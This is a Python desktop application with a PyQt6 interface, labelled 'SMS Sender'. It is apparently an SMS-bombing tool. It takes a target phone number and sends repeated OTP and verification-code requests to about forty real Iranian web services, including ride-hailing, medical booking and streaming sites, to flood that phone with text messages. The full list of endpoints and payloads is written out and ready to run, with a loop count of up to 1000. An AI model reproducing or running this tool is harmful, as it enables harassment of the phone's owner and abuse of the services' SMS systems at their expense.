import json
import requests
import random
import string
import logging
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                            QLineEdit, QPushButton, QTextEdit, QProgressBar, QLabel, 
                            QSpinBox, QGroupBox, QMessageBox, QStatusBar, QCheckBox,
                            QGridLayout, QFrame)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont, QIcon, QPalette, QColor
import sys
import uuid
import qdarkstyle

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def random_string(length=10):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def make_request(method, url, data=None, headers=None):
    try:
        if method.lower() == 'post':
            response = requests.post(url, data=data, headers=headers, timeout=10)
        elif method.lower() == 'get':
            response = requests.get(url, params=data, timeout=10)
        else:
            raise ValueError(f"Unsupported method: {method}")
        response.raise_for_status()
        logger.info(f"Successfully sent request to {url}")
        return response
    except (requests.exceptions.RequestException, ValueError) as e:
        logger.error(f"Failed to send request to {url}: {str(e)}")
        return None

class RequestWorker(QThread):
    progress_update = pyqtSignal(int)
    log_update = pyqtSignal(str)
    finished = pyqtSignal(dict)

    def __init__(self, number, count, services):
        super().__init__()
        self.number = number
        self.count = count
        self.services = services
        self.is_running = True

    def run(self):
        full_phone = f"0{self.number}"
        counts = 0
        total_requests = self.count * len(self.services)

        headers_json = {'Content-Type': 'application/json'}
        headers_form = {'Content-Type': 'application/x-www-form-urlencoded'}

        for i in range(self.count):
            if not self.is_running:
                break

            for service in self.services:
                if not self.is_running:
                    break
                
                if service['name'] == "Snapp" and service['enabled']:
                    url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
                    payload = json.dumps({"cellphone": f"+98{self.number}"})
                    if make_request('post', url, payload, headers_json):
                        counts += 1

                elif service['name'] == "AliBaba" and service['enabled']:
                    url = 'https://ws.alibaba.ir/api/v2/account/otp'
                    payload = json.dumps({"phoneNumber": self.number})
                    if make_request('post', url, payload, {'Content-Type': 'application/json;charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "eCharge" and service['enabled']:
                    url = 'https://www.echarge.ir/m/login?length=19'
                    params = {'phoneNumber': f'0{self.number}'}
                    if make_request('post', url, params):
                        counts += 1

                elif service['name'] == "Pikato" and service['enabled']:
                    url = 'http://api.pikato.net/users/mobile-login'
                    payload = json.dumps({
                        'deviceId': "b09df731ffd613a5",
                        'firebaseId': "fdPz8h8oo5g:APA91bEmK9-EUXt-FsQ1CGIIVBZkAjm4Cd25Si86dxzHuRxcUASTh8hUlvkhFmwoWW2eY9rwAC2Jm6xqXOcKQDuz_0v8TRsdwiBQqyeI516Tt3cshCNi24KVIYqRgAxueQ7youcrHAAi",
                        'mobile': self.number
                    })
                    if make_request('post', url, payload, {'Application': 'pikatoMobilePrz'}):
                        counts += 1

                elif service['name'] == "Tapsi" and service['enabled']:
                    url = 'https://tap33.me/api/v2/user'
                    payload = json.dumps({"credential": {"phoneNumber": full_phone, "role": "PASSENGER"}})
                    if make_request('post', url, payload, headers_json):
                        counts += 1

                elif service['name'] == "GapFilm" and service['enabled']:
                    url = 'https://core.gapfilm.ir/mobile/request.asmx/RequestOtpCode'
                    payload = json.dumps({"request": {"Phone": self.number}})
                    if make_request('post', url, payload, {'Content-Type': 'application/json;charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "Divar" and service['enabled']:
                    url = 'https://api.divar.ir/v5/auth/authenticate'
                    payload = json.dumps({"phone": self.number})
                    if make_request('post', url, payload, headers_form):
                        counts += 1

                elif service['name'] == "Emtiyaz" and service['enabled']:
                    url = 'https://web.emtiyaz.app/json/login'
                    payload = f"send=1&cellphone={self.number}"
                    if make_request('post', url, payload, headers_form):
                        counts += 1

                elif service['name'] == "Tebinja" and service['enabled']:
                    url = 'https://www.tebinja.com/api/v1/users'
                    payload = json.dumps({"username": full_phone})
                    if make_request('post', url, payload, {'Content-Type': 'application/json;charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "Nobat.ir" and service['enabled']:
                    url = 'https://nobat.ir/nuser/inc/nUserSendCode'
                    payload = f"mobile={full_phone}"
                    if make_request('post', url, payload, {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "Doctoreto" and service['enabled']:
                    url = 'https://doctoreto.com/web/api/v2/auth/code'
                    payload = json.dumps({"mobile": full_phone})
                    if make_request('post', url, payload, {'Content-Type': 'application/json;charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "Doctor Doctor" and service['enabled']:
                    url = 'https://drdr.ir/api/registerEnrollment/verifyMobile'
                    payload = json.dumps({"phoneNumber": self.number, "userType": "PATIENT"})
                    if make_request('post', url, payload, {'Content-Type': 'application/json;charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "Bitel" and service['enabled']:
                    url = 'https://api.bitel.rest/api/v1/auth/otp'
                    payload = json.dumps({"phone": full_phone, "type": 1})
                    if make_request('post', url, payload, headers_json):
                        counts += 1

                elif service['name'] == "Bitooman" and service['enabled']:
                    url = 'https://www.bitooman.ir/Account/SendAgainCellPhoneVerificationKey'
                    payload = f"CellPhoneNumber={full_phone}"
                    if make_request('post', url, payload, {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "BaniMode" and service['enabled']:
                    url = 'https://mobapi.banimode.com/api/v1/auth/request'
                    payload = json.dumps({"phone": f"0{self.number}"})
                    if make_request('post', url, payload, {'Content-Type': 'application/json;charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "Anten" and service['enabled']:
                    url = 'https://api2.anten.ir/users/'
                    payload = json.dumps({"phone": f"0{self.number}"})
                    if make_request('post', url, payload, {'Content-Type': 'application/json;charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "Shab" and service['enabled']:
                    url = 'https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile'
                    payload = json.dumps({"mobile": full_phone, "country_code": "+98"})
                    if make_request('post', url, payload, headers_json):
                        counts += 1

                elif service['name'] == "Otaghak" and service['enabled']:
                    url = 'https://www.otaghak.com/odata/Otaghak/Users/SendVerificationCode'
                    payload = json.dumps({"userName": full_phone})
                    if make_request('post', url, payload, headers_json):
                        counts += 1

                elif service['name'] == "Pinket" and service['enabled']:
                    url = 'https://pinket.com/api/cu/v1/phone_verification'
                    payload = json.dumps({"phoneNumber": full_phone})
                    if make_request('post', url, payload, {'Content-Type': 'application/json;charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "Chamedoon" and service['enabled']:
                    url = 'https://chamedoon.com/api/v1/membership/guest/request_mobile_verification'
                    payload = json.dumps({"mobile": full_phone})
                    if make_request('post', url, payload, {'Content-Type': 'application/json;charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "GapFilm2" and service['enabled']:
                    url = 'https://core.gapfilm.ir/api/v3.1/Account/Login'
                    payload = json.dumps({"Type": 3, "Username": self.number})
                    if make_request('post', url, payload, {'Content-Type': 'application/json; charset=utf-8'}):
                        counts += 1

                elif service['name'] == "Wishato" and service['enabled']:
                    url = 'https://wishato.com/api/users/join/signup'
                    payload = json.dumps({"cellphone": f"+98-{self.number}"})
                    if make_request('post', url, payload, headers_json):
                        counts += 1

                elif service['name'] == "A4Baz" and service['enabled']:
                    url = 'https://a4baz.com/api/web/login'
                    payload = json.dumps({"cellphone": full_phone})
                    if make_request('post', url, payload, {'Content-Type': 'application/json; charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "Bidzila" and service['enabled']:
                    url = 'https://api.bidzila.com/api/register'
                    payload = json.dumps({
                        "mobile": full_phone,
                        "first_name": "test",
                        "last_name": "test",
                        "nick_name": random_string(),
                        "acq": ""
                    })
                    if make_request('post', url, payload, {'Content-Type': 'application/json;charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "Namava" and service['enabled']:
                    url = 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request'
                    payload = json.dumps({"UserName": f"+98{self.number}"})
                    if make_request('post', url, payload, {'Content-Type': 'application/json;charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "Daste2" and service['enabled']:
                    url = 'https://dast2.com/token'
                    payload = json.dumps({"cellphone": full_phone})
                    if make_request('post', url, payload, {'Content-Type': 'application/json;charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "RojaShop" and service['enabled']:
                    url = 'https://rojashop.com/api/auth/sendOtp'
                    payload = f"mobile={full_phone}"
                    if make_request('post', url, payload, {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "Bookapo" and service['enabled']:
                    url = 'https://bookapo.com/index.php?plugin=bookapo_sms'
                    payload = f"mobile={full_phone}"
                    if make_request('post', url, payload, {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "Payfa" and service['enabled']:
                    url = 'https://my.payfa.com/signup'
                    payload = f"mobile={full_phone}"
                    if make_request('post', url, payload, headers_form):
                        counts += 1

                elif service['name'] == "Pubisha" and service['enabled']:
                    url = 'https://www.pubisha.com/login/checkCustomerActivation'
                    payload = f"mobile={full_phone}"
                    if make_request('post', url, payload, headers_form):
                        counts += 1

                elif service['name'] == "SnappTrip" and service['enabled']:
                    url = 'https://www.snapptrip.com/register'
                    payload = json.dumps({
                        "lang": "fa",
                        "country_id": "860",
                        "password": "thepass",
                        "mobile_phone": full_phone,
                        "country_code": "+98",
                        "email": "testmail11@gmail.com"
                    })
                    if make_request('post', url, payload, {'Content-Type': 'application/json; charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "TamLand" and service['enabled']:
                    url = 'https://api.famiran.com/api/user/signup'
                    payload = json.dumps({"Mobile": full_phone, "SchoolId": "-1"})
                    if make_request('post', url, payload, {'Content-Type': 'application/json; charset=utf-8'}):
                        counts += 1

                elif service['name'] == "Taghche" and service['enabled']:
                    url = 'https://api.taaghche.com/mybook/site/otp/phone'
                    payload = json.dumps({"phone": full_phone})
                    if make_request('post', url, payload, headers_json):
                        counts += 1

                elif service['name'] == "Sibche" and service['enabled']:
                    url = 'https://api.sibche.com/profile/sendCode'
                    payload = json.dumps({"mobile": full_phone})
                    if make_request('post', url, payload, {'Content-Type': 'application/json;charset=UTF-8'}):
                        counts += 1

                elif service['name'] == "Bimito" and service['enabled']:
                    url = f"https://api2.velayat.rafda.ir/api/login/captcha?mobile={full_phone}&usernamePrefix=0"
                    if make_request('get', url):
                        counts += 1

                elif service['name'] == "Snapp Doctor" and service['enabled']:
                    url = f"https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{self.number}/sms?cCode=98"
                    if make_request('get', url):
                        counts += 1

                elif service['name'] == "FilmNet" and service['enabled']:
                    url = f"https://api-v2.filmnet.ir/access-token/users/{full_phone}/otp"
                    if make_request('get', url):
                        counts += 1

                elif service['name'] == "GAP" and service['enabled']:
                    url = f"https://core.gap.im/v1/user/add.json?mobile=0{self.number}"
                    if make_request('get', url):
                        counts += 1

                elif service['name'] == "Torob" and service['enabled']:
                    url = f"https://api.torob.com/a/phone/send-pin/?phone_number=0{self.number}"
                    if make_request('get', url):
                        counts += 1

                elif service['name'] == "AzKi" and service['enabled']:
                    url = f"https://www.azki.com/api/customer/register/check-phone-number?phoneNumber=azki_0{self.number}"
                    if make_request('get', url):
                        counts += 1

                elif service['name'] == "Axprint" and service['enabled']:
                    url = f"https://axprint.com/api/user/RequestVerifyCode?mobile={full_phone}&isFromAxbox=false"
                    if make_request('get', url):
                        counts += 1

                current_progress = int(((i * len(self.services) + (self.services.index(service) + 1)) / total_requests) * 100)
                self.progress_update.emit(current_progress)
                self.log_update.emit(f"Attempted {service['name']} in iteration {i + 1}")

        result = {'status': 'success' if counts > 0 else 'failed', 'count': self.count, 'sms_sent': counts}
        self.finished.emit(result)

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("SMS Sender - Professional Interface")
        self.setGeometry(100, 100, 800, 600)
        self.setWindowIcon(QIcon('icon.png'))

        # Initialize services list
        self.services = [
            {"name": "Snapp", "enabled": True}, {"name": "AliBaba", "enabled": True},
            {"name": "eCharge", "enabled": True}, {"name": "Pikato", "enabled": True},
            {"name": "Tapsi", "enabled": True}, {"name": "GapFilm", "enabled": True},
            {"name": "Divar", "enabled": True}, {"name": "Emtiyaz", "enabled": True},
            {"name": "Tebinja", "enabled": True}, {"name": "Nobat.ir", "enabled": True},
            {"name": "Doctoreto", "enabled": True}, {"name": "Doctor Doctor", "enabled": True},
            {"name": "Bitel", "enabled": True}, {"name": "Bitooman", "enabled": True},
            {"name": "BaniMode", "enabled": True}, {"name": "Anten", "enabled": True},
            {"name": "Shab", "enabled": True}, {"name": "Otaghak", "enabled": True},
            {"name": "Pinket", "enabled": True}, {"name": "Chamedoon", "enabled": True},
            {"name": "GapFilm2", "enabled": True}, {"name": "Wishato", "enabled": True},
            {"name": "A4Baz", "enabled": True}, {"name": "Bidzila", "enabled": True},
            {"name": "Namava", "enabled": True}, {"name": "Daste2", "enabled": True},
            {"name": "RojaShop", "enabled": True}, {"name": "Bookapo", "enabled": True},
            {"name": "Payfa", "enabled": True}, {"name": "Pubisha", "enabled": True},
            {"name": "SnappTrip", "enabled": True}, {"name": "TamLand", "enabled": True},
            {"name": "Taghche", "enabled": True}, {"name": "Sibche", "enabled": True},
            {"name": "Bimito", "enabled": True}, {"name": "Snapp Doctor", "enabled": True},
            {"name": "FilmNet", "enabled": True}, {"name": "GAP", "enabled": True},
            {"name": "Torob", "enabled": True}, {"name": "AzKi", "enabled": True},
            {"name": "Axprint", "enabled": True}
        ]

        # Set up main widget and layout
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.main_layout = QVBoxLayout(self.central_widget)

        # Input Group
        input_group = QGroupBox("Input Parameters")
        input_layout = QGridLayout()
        
        self.phone_label = QLabel("Phone Number (10 digits):")
        self.phone_input = QLineEdit()
        self.phone_input.setPlaceholderText("Enter 10-digit phone number")
        self.phone_input.setMaxLength(10)
        
        self.count_label = QLabel("Number of Iterations:")
        self.count_input = QSpinBox()
        self.count_input.setRange(1, 1000)
        self.count_input.setValue(1)

        input_layout.addWidget(self.phone_label, 0, 0)
        input_layout.addWidget(self.phone_input, 0, 1)
        input_layout.addWidget(self.count_label, 1, 0)
        input_layout.addWidget(self.count_input, 1, 1)
        
        input_group.setLayout(input_layout)
        self.main_layout.addWidget(input_group)

        # Services Selection Group
        services_group = QGroupBox("Select Services")
        services_layout = QGridLayout()
        
        self.service_checkboxes = []
        for i, service in enumerate(self.services):
            checkbox = QCheckBox(service['name'])
            checkbox.setChecked(True)
            checkbox.stateChanged.connect(lambda state, idx=i: self.toggle_service(idx, state))
            self.service_checkboxes.append(checkbox)
            services_layout.addWidget(checkbox, i // 4, i % 4)
        
        services_group.setLayout(services_layout)
        self.main_layout.addWidget(services_group)

        # Control Buttons
        button_layout = QHBoxLayout()
        self.start_button = QPushButton("Start")
        self.start_button.clicked.connect(self.start_requests)
        self.stop_button = QPushButton("Stop")
        self.stop_button.clicked.connect(self.stop_requests)
        self.stop_button.setEnabled(False)
        self.clear_button = QPushButton("Clear Log")
        self.clear_button.clicked.connect(self.clear_log)
        
        button_layout.addWidget(self.start_button)
        button_layout.addWidget(self.stop_button)
        button_layout.addWidget(self.clear_button)
        
        self.main_layout.addLayout(button_layout)

        # Progress Bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)
        self.main_layout.addWidget(self.progress_bar)

        # Log Output
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setFont(QFont("Consolas", 10))
        self.main_layout.addWidget(self.log_output)

        # Status Bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        
        self.worker = None

    def toggle_service(self, index, state):
        self.services[index]['enabled'] = state == Qt.CheckState.Checked.value

    def start_requests(self):
        phone = self.phone_input.text()
        count = self.count_input.value()

        if not phone.isdigit() or len(phone) != 10:
            QMessageBox.warning(self, "Invalid Input", "Please enter a valid 10-digit phone number")
            return

        if not any(service['enabled'] for service in self.services):
            QMessageBox.warning(self, "No Services Selected", "Please select at least one service")
            return

        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.progress_bar.setValue(0)
        self.log_output.clear()

        self.worker = RequestWorker(phone, count, self.services)
        self.worker.progress_update.connect(self.update_progress)
        self.worker.log_update.connect(self.update_log)
        self.worker.finished.connect(self.requests_finished)
        self.worker.start()

    def stop_requests(self):
        if self.worker:
            self.worker.is_running = False
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)

    def update_progress(self, value):
        self.progress_bar.setValue(value)

    def update_log(self, message):
        self.log_output.append(message)

    def clear_log(self):
        self.log_output.clear()

    def requests_finished(self, result):
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.status_bar.showMessage(f"Completed: {result['sms_sent']} SMS sent successfully")
        QMessageBox.information(self, "Result", 
                              f"Status: {result['status']}\n"
                              f"Total Iterations: {result['count']}\n"
                              f"SMS Sent: {result['sms_sent']}")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    
    # Apply Windows 11 style using qdarkstyle
    app.setStyleSheet(qdarkstyle.load_stylesheet(qt_api='pyqt6', palette=qdarkstyle.DarkPalette))
    
    # Customize palette for Windows 11 look
    palette = QPalette()
    palette.setColor(QPalette.ColorRole.Window, QColor(30, 30, 30))
    palette.setColor(QPalette.ColorRole.WindowText, Qt.GlobalColor.white)
    palette.setColor(QPalette.ColorRole.Base, QColor(45, 45, 45))
    palette.setColor(QPalette.ColorRole.AlternateBase, QColor(53, 53, 53))
    palette.setColor(QPalette.ColorRole.Text, Qt.GlobalColor.white)
    palette.setColor(QPalette.ColorRole.Button, QColor(60, 60, 60))
    palette.setColor(QPalette.ColorRole.ButtonText, Qt.GlobalColor.white)
    palette.setColor(QPalette.ColorRole.Highlight, QColor(0, 120, 215))
    app.setPalette(palette)
    
    window = MainWindow()
    window.show()
    sys.exit(app.exec())